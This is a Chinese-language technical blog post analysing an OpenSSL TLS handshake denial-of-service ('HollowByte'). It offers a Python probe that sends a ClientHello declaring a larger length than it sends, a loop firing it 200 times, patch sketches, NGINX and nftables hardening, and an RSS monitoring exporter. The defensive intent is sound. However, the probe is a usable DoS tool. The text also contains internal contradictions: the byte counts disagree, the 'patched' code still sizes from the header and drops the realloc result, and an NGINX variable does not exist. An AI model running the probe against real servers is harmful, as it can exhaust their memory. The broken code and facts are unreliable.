---
title: "HollowByte 解剖：11 字节如何让一台服务器在无一枚 CVE 的情况下搁浅"
date: 2026-07-20T05:34:00Z
draft: false
tags: ["Security", "OpenSSL", "DoS"]
categories: ["技术实践"]
author: "X 实验室"
description: "从工程角度剖析 OpenSSL 的 HollowByte 拒绝服务漏洞：11 字节的 TLS 握手头触发未校验预分配，叠加 glibc 的内存保留机制，最终把 RSS 顶到无解的高位。"
summary: "拆解 Okta Red Team 于 2026 年 7 月公开的 OpenSSL HollowByte DoS：4 字节的 TLS 握手头如何让未校验的预分配一路涨到 131 KB、glibc 碎片化如何把已释放的块变成永久堆积、OpenSSL 的修复如何转向惰性增量分配，以及站点可靠性工程师如何检测并硬化这一漏洞类别。"
toc: true
---

## 背景与动机

2026 年 7 月 16 日，Okta 的红队发布了一篇题为 *OpenSSL HollowByte: A DoS Hiding in 11 Bytes* 的分析（[Okta Security](https://sec.okta.com/articles/2026/06/openssl-hollowbtye-a-dos-hiding-in-11-bytes/)）。该漏洞允许远程、**未授权**的攻击者用一个 11 字节的恶意载荷，在 TLS 握手尚未开始之前就迫使服务器分配大量内存。24 小时内，BleepingComputer（[原文](https://www.bleepingcomputer.com/news/security/hollowbyte-ddos-flaw-bloats-openssl-server-memory-with-11-byte-payload/)）和 The Hacker News（[原文](https://thehackernews.com/2026/07/openssl-hollowbyte-flaw-could-freeze.html)）分别跟进报道。**特别值得注意的是，OpenSSL 团队并没有为这个漏洞分配 CVE 编号**，而是把补丁（PR #30792、#30793、#30794）当作一项*加固*处理，并静默回溯至 OpenSSL 3.6.3、3.5.7、3.4.6、3.0.21。

这种表述方式有真实的运维成本：静默 bucket = 静默公告 = 静默 changelog = 静默堆膨胀。对站点可靠性工程师而言，可学的工程经验有三条 ——（a）TLS 状态机里 "信任头部再分配" 的反模式，（b）glibc 如何把 "已释放" 变成 "已泄漏"，以及（c）如何在自家服务器上检测 RSS 漂移。本文拆解机制、给出可复现的探测器，并梳理整治路径。

## 前置条件

- 一台装有 **早于上述补丁版本** 的 OpenSSL 3.x 的 Linux 服务器。从 Debian 默认的 `3.0.x` 到 Ubuntu 的 `3.5.x` 均在范围内。
- Shell 权限足以安装 `openssl-s_client`、`ss`、`ps`、`pmap`，以及一个支持 TLS 的压测工具，例如 `openssl s_time` 或 `hey`。
- 一个绑定 443 的**非生产** NGINX（或 Apache）前端，且 `worker_processes auto;` 与 `worker_connections 1024;` —— Okta 测试用的就是这套默认值。
- 主机当前 OpenSSL 版本，以便做差异比对：`openssl version -a` 会给出构建提交号。注意发行版的包可能会回溯补丁但不动显示版本号，所以一定要交叉核对你所用发行版的 changelog。

## 步骤一：准备工作

首先要给服务器的稳态 RSS 建立基线，否则没法把 HollowByte 造成的漂移和有机增长区分开。*单个* HollowByte 浪潮每秒可让 RSS 涨几十 MB，但如果没有基线，就无法识别这一异常。

```bash
# 取 NGINX 主进程 PID 和 RSS 基线（单位 kB）
NGINX_PID=$(systemctl show -p MainPID --value nginx)
ps -o rss= -p "$NGINX_PID" | awk '{printf "主进程 RSS 基线: %.1f MB\n", $1/1024}'

# 对每个 worker 的 RSS 做分布快照 —— HollowByte 撑大的是 *worker*
ps -o pid,rss,cmd --ppid "$NGINX_PID" | awk 'NR>1{printf "worker %d %.1f MB\n", $1, $2/1024}'
```

把上述快照和 `pmap -x "$NGINX_PID"` 里的 `[heap]` 行对比一下。在空闲机器上，健康的 NGINX worker 通常 RSS 5-20 MB，heap 不上两位数 MB。一旦攻击者开始打 HollowByte 浪潮，你会发现 worker 的 RSS **持续** 上升而 *活动连接数却没对应增长* —— 这种解耦就是步骤三里要检测的特征。

## 步骤二：核心实现

恶意载荷本身构造起来并不复杂 —— 只有亲手复现，才能确认你的测试环境是否真的能复现漏洞路径。Okta 文章的关键洞见是：攻击者在 4 字节 TLS 握手头里**声明一个很大的**握手体长度，但实际只发足以触发 `OPENSSL_clear_realloc()` 的几个字节：

```python
#!/usr/bin/env python3
# hollowbyte_probe.py —— 仅限本地测试，且只能对自己服务器用。
# 发送单个声明超大体长的 ClientHello，用来验证打过补丁的 OpenSSL 确实拒绝预分配。
# 永远不要对生产环境用。

import socket, struct, sys, time

def build_dirty_client_hello(host: str, port: int) -> bytes:
    # 一个最小化的 ClientHello 体（在握手头之后约 11 字节）
    # 握手头会 *声称* 一个大得多的大小，借此触发 grow_init_buf()
    body = bytes([
        0x01,                              # 握手类型: ClientHello
        0x00, 0x08, 0x00,                  # 声明的握手长度: 0x000800 = 2048 字节
        0x03, 0x03,                        # TLS 1.2
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00 # 6 字节 "真实" 体 —— 远短于声明
    ])
    record = bytes([
        0x16,                              # 内容类型: handshake
        0x03, 0x01,                        # 记录版本: TLS 1.0
    ]) + struct.pack(">H", len(body)) + body
    return record

def probe(host: str, port: int) -> None:
    pkt = build_dirty_client_hello(host, port)
    sock = socket.create_connection((host, port), timeout=5)
    sock.sendall(pkt)
    time.sleep(0.1)
    # 在有漏洞版本的 OpenSSL 上，服务器此刻已对声明的大小调用 OPENSSL_clear_realloc
    # 并正在阻塞等待永不会到达的数据
    sock.close()
    print("[+] 脏 ClientHello 已发出；请 ps -o rss 查看 TLS worker")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        sys.exit("用法: hollowbyte_probe.py <本地测试主机> <端口>")
    probe(sys.argv[1], int(sys.argv[2]))
```

拿来对此探测针验证的 *补救* —— 即 OpenSSL 实际发布的修复 —— 是把 *头部声明式* 分配改为 *增量式* 分配。OpenSSL 在 `ssl_stat.c` 与 `record/rec_layer_d1.c` 处的修改把 `grow_init_buf()` 折叠成只在真实字节流入网络时才扩容。下面给出概念补丁；你应该把自己发行版打包的补丁和 OpenSSL PR #30792 做差异比对来确认。

```c
// 有漏洞版本（PR #30792 之前的 grow_init_buf 释义版）
static int grow_init_buf(SSL *s, size_t len) {
    // `len` 直接取自握手头 —— 这是来自不可信来源的输入！
    if (s->init_buf == NULL || len > s->init_buf->length) {
        OPENSSL_clear_realloc(s->init_buf, 1, len); // 上限 1<<17 = 131072
    }
    return 1;
}

// 打补丁版本（PR #30792、#30793、#30794 之后）
static int grow_init_buf(SSL *s, size_t len) {
    // 绝不信头部。按字节实际到达量以 4 KB 步进扩容。
    const size_t cap = s->init_buf ? s->init_buf->length : 0;
    if (len > cap) {
        size_t newcap = cap ? cap : 4096;
        while (newcap < len) { newcap *= 2; }   // 只在必要时扩
        OPENSSL_clear_realloc(s->init_buf, 1, newcap);
    }
    return 1;
}
```

*运维* 层的加固 —— 即使你暂时不能立即升级也依旧有效 —— 是 NGINX 配置里两段用来收紧攻击面和探测漂移的增补：

```nginx
# /etc/nginx/nginx.conf（或 http {} 块）

# 1. 限制单 IP 新建连接速率，让攻击者无法简单地把浪潮喷洒过来
limit_conn_zone $binary_remote_addr zone=tls_conn:10m;

# 2. 限制超大初始 record —— 真 ClientHello 永远不超过 16 KB
#    NGINX 不直接暴露 TLS record 头，但用 iptables 能：
#    - 443 入站，--connlimit-upto 30 个新连接 / 30s 内 / 每个 /32
#    - 若*第一条* record 头声称 > 16384 字节就丢（nft 状态化规则）

# 3. 通过 `$msec` 把 worker RSS 写进访问日志，
#    这样监控就能识别 HollowByte 的特征（RSS 涨、活动连接数却平）
log_format hollowbyte '$msec\t$connection\t$remote_addr\t'
                      '$status\t$request_time\t$body_bytes_sent\t'
                      'worker_rss=${worker_rss}kB';
access_log /var/log/nginx/hollowbyte.log hollowbyte;
```

## 步骤三：验证与调优

应用补丁（或上节的 `_ZONE` 减轻措施）之后，你要做一次正向验证，确认这个 DoS 类别确实关掉了。快速循环如下：

```bash
# 1. 抓 worker RSS 基线
NGINX_PID=$(systemctl show -p MainPID --value nginx)
ps -o rss= -p "$NGINX_PID" | awk '{b=$1} END {print b}' > /tmp/rss_base

# 2. 从 *你自己的* 测试工具依次打 200 次 HollowByte 探测
for i in $(seq 1 200); do python3 hollowbyte_probe.py localhost 443; done

# 3. 重新快照并做差异
NEW=$(ps -o rss= -p "$NGINX_PID" | awk '{print $1}')
BASE=$(cat /tmp/rss_base)
echo "RSS 之前: $BASE kB / 之后: $NEW kB"
awk -v b="$BASE" -v n="$NEW" 'BEGIN{d=n-b; \
  printf "增量: %d kB（%.1f%%）\n", d, (d/b)*100}'
```

打过补丁的 OpenSSL 增长应 ≤ 1 KB —— 单次分配上限现在是 4 KB，操作系统会立刻回收释放的小块，glibc 没什么可保留。未打补丁的 OpenSSL 将 ≥ 200 MB 增长，且 —— 关键点 —— *连接结束之后 RWS 也不会回落*（glibc 再保留一次）。一台有漏洞机器上唯一可靠的恢复手段就是 `systemctl restart nginx`。这一条事实就是 HollowByte 在运维上为何致命：等 `dmesg` 里出现 `[oom-killer]`，你已经晚了一拍。

要长期监测，把下面这个小的 Munin/Prometheus exporter 接到 textfile collector，让告警直接盯住 HollowByte 特征 —— *RSS 在涨而 `nginx_connections_active` 平直*：

```python
#!/usr/bin/env python3
# rss_active_delta.py —— 输出管道接到 textfile collector
import psutil
pids = [p.pid for p in psutil.process_iter(['name']) if p.info['name'] == 'nginx']
rss_mb = sum(p.memory_info().rss for p in (psutil.Process(p) for p in pids)) / 2**20
active = int(open('/var/lib/nginx/active').read().strip())
print(f"nginx_rss_mb {rss_mb}")
print(f"nginx_active_conns {active}")
print(f"nginx_hollowbyte_ratio {rss_mb / max(active, 1):.3f}")
```

默认配置下，这个比例超过 **3 MB / 活动连接** 就是异常 —— 多数生产 NGINX 部署在 0.5 MB 以下。周环比的 9 周滑动差值是你的慢燃探测器。

## 最佳实践小结

- **永远别信头部。** 任何在字节到达之前就分配的接收路径都是一个等着被拉动的拒绝服务杠杆。审计你自己的协议解析器 —— 不止 TLS —— 同类 bug 在任何 RPC 框架里都可能复现。
- **没有 CVE 编号的 OpenSSL 发行版也要当成正经发行版对待。** HollowByte 是一个有文档支撑的趋势的一部分（2025 的 `cms_dh` 修、2024 的 `punycode` 修），OpenSSL 在悄悄发加固补丁。按 commit 列表跟踪 OpenSSL 的发行说明，**不要**按 CVE tracker 跟；要默认"静默"= 重要。
- **给 *初始* record 设上限。** 合法的 TLS `ClientHello` 永远不会超过 16 KB。一条 `nftables` 规则能在 TLS 体字节到达前，丢弃那些 5 字节 record 头声称体 > 16384 的初始记录，从内核层关掉这一类攻击，不必动 OpenSSL。
- **用 RSS 与活动连接数的 *比例*监控**，而不是绝对值。"超 2 GB" 的绝对值告警，对 Okta 实测能打到 25% OOM 的 16 GB 服务器会漏报。比例到 3 MB / 活动连接的告警能提前几分钟触发。
- **假设 glibc 会保留。** "malloc 后 free" 不会把内存还给操作系统，除非 `MADV_DONTNEED` 或进程退出。对于长期守护进程，且承载碎片化负载模式的，评估把分配器换成 `jemalloc` 或 `mimalloc` —— 它们会激进归还释放的小块，在未打补丁的系统上能把 HollowByte 的杀伤半径降一个数量级。

## 参考资料

- [OpenSSL HollowByte: A DoS Hiding in 11 Bytes — Okta Red Team](https://sec.okta.com/articles/2026/06/openssl-hollowbtye-a-dos-hiding-in-11-bytes/)
- [OpenSSL HollowByte Flaw Could Freeze Server Memory with 11-Byte TLS Requests — The Hacker News](https://thehackernews.com/2026/07/openssl-hollowbyte-flaw-could-freeze.html)
- [HollowByte DDoS flaw bloats OpenSSL server memory with 11-byte payload — BleepingComputer](https://www.bleepingcomputer.com/news/security/hollowbyte-ddos-flaw-bloats-openssl-server-memory-with-11-byte-payload/)
- [OpenSSL Vulnerabilities (3.0 系列) — 官方漏洞归档](https://openssl-library.org/news/vulnerabilities-3.0/)
- [OpenSSL PR #30792 — 增量缓冲区扩容补丁](https://github.com/openssl/openssl/pull/30792)
